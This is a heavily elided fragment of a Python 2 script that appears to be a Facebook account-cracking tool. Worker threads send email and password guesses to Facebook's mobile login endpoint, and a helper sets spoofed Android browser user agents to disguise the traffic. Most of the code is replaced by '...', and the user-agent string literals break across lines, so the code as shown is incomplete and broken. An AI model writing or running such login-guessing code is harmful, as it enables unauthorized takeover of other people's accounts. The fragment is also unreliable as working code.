...
class mt(threading.Thread):
	...
	def run(self):
		...
		try:
			...
			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android10.SM-S901B)
AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/112.0.0.010004243.128.Mobile Safari/537.36'}))
...
def install_browser():
	...
	br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android11.Redmi Note 9
Pro) AppleWebKit/537.36 (KHTML, seperti Gecko)
Chrome/112.0.0.09004584.98.Mobile Safari/537.36')]
